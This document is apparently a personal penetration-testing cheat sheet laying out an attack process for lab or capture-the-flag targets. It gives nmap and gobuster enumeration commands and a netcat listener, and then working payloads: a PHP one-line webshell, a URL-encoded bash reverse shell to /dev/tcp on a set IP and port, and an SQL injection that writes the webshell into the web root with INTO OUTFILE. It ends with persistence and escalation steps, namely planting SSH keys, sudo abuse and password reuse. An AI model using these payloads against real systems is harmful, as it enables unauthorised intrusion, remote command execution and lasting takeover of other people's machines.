# Attack Process

## Initial Enumeration

Nmap: 

```bash
sudo nmap -sC -sV -n $TARGET; sudo nmap -sU --max-retries 1 -v -n $TARGET;
```

## Setup for incoming reverse shells

```bash
nc -lnvp 12345
```

## Web Enumeration

If webservers are involved

Gobuster:

```bash
gobuster dir -u http://$TARGET:$HTTP_PORT/ -w /usr/share/wordlists/dirb/common.txt
```

- Read source files
- Examine requests sent as the interface is used
    - Look for cookies/parameters for reuse/injection/etc.
- Fuzz simple bad data/try common creds
- If file upload is available and php is used, upload a reverse php shell

### Webshell

If we can create a PHP file with the following contents:

```php
<?php SYSTEM($_REQUEST['cmd']); ?>
```

Then we can run arbitrary commands by sending payloads with

```
cmd=<url encoded command>
```

For example:

```
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.10/12345+0>%261'
```

Will run the command

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/12345 2>&1'
```

A PHP reverse-shell may be more useful if networking allows it, but the webshell can perform requests even if no reverse shell is possible.

### SQL Injection

#### Outfile

```sql
' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

## Solidify and Escalate From Shell

- whoami
- If SSH is available, place your public key in ~/.ssh/authorized_keys
- sudo -l
    - anything we can run as sudo without a password (or with a password if we have creds), look up GTFOBins
- 

### Password Reuse

Try to get root shell with reused password: 

```
su -
```

# Useful Tools

## CyberChef

https://gchq.github.io/CyberChef/